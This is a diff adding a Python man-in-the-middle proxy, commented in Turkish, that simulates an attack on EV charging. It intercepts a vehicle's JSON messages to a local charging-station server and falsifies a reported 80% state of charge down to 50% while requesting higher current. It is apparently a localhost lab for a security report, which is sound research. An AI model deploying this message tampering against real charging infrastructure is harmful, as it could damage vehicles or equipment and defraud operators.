@@ -1,0 +1,75 @@
+# mitm_proxy.py (Ortadaki Adam - Saldırı Simülatörü)
+import socket
+import json
+import threading
+
+# Ayarlar
+PROXY_HOST = '127.0.0.1'
+PROXY_PORT = 8000        # Aracın bağlanacağı port
+SERVER_HOST = '127.0.0.1'
+SERVER_PORT = 9005       # Gerçek şarj istasyonunun portu
+
+def handle_client(client_socket):
+    try:
+        # Gerçek sunucuya (EVSE) bağlan
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+            server_socket.connect((SERVER_HOST, SERVER_PORT))
+            print(f"[MitM] Gerçek sunucuya ({SERVER_HOST}:{SERVER_PORT}) bağlandı.")
+            
+            while True:
+                # Araçtan (client) gelen veriyi al
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                
+                try:
+                    # Veriyi manipüle etmek için JSON olarak aç
+                    mesaj = json.loads(data.decode('utf-8'))
+                    print(f"\n[MitM] Araçtan YAKALANAN MESAJ: {mesaj}")
+
+                    # --- SALDIRI MANTIĞI BURADA ---
+                    # Rapor senaryosu: Eğer araç SoC %80 veya üzeri olduğunu söylerse...
+                    if mesaj.get('soc', 0) >= 80:
+                        print("[MitM] !!! SALDIRI !!! Dürüst SoC (%80) mesajı yakalandı.")
+                        
+                        # Mesajı manipüle et
+                        sahte_mesaj = {
+                            "soc": 50,  # SoC'yi düşük göster
+                            "target_current": 60 # Yüksek akım iste
+                        }
+                        print(f"[MitM] SAHTE MESAJ OLUŞTURULDU: {sahte_mesaj}")
+                        data = json.dumps(sahte_mesaj).encode('utf-8')
+                    else:
+                        print("[MitM] Mesaj normal, değişiklik yapılmadı.")
+                        
+                    # Manipüle edilmiş (veya edilmemiş) veriyi sunucuya gönder
+                    server_socket.sendall(data)
+
+                except json.JSONDecodeError:
+                    print("[MitM] Hata: JSON olmayan veri alındı, doğrudan iletiliyor.")
+                    server_socket.sendall(data) # Veri JSON değilse bile ilet
+                
+    except ConnectionRefusedError:
+        print(f"[MitM] HATA: Gerçek sunucuya ({SERVER_HOST}:{SERVER_PORT}) bağlanılamadı. evse_server.py çalışıyor mu?")
+    except Exception as e:
+        print(f"[MitM] Bir hata oluştu: {e}")
+    finally:
+        print("[MitM] İstemci bağlantısı kapandı.")
+        client_socket.close()
+
+# Ana proxy sunucusu
+def start_proxy():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((PROXY_HOST, PROXY_PORT))
+        s.listen()
+        print(f"[MitM] Saldırı proxy'si {PROXY_HOST}:{PROXY_PORT} adresinde dinlemede...")
+        
+        while True:
+            conn, addr = s.accept()
+            print(f"\n[MitM] Araçtan yeni bağlantı kabul edildi: {addr}")
+            # Her bağlantıyı ayrı bir thread'de yönet (birden fazla aracı simüle etmek için)
+            client_thread = threading.Thread(target=handle_client, args=(conn,))
+            client_thread.start()
+
+if __name__ == "__main__":
+    start_proxy()
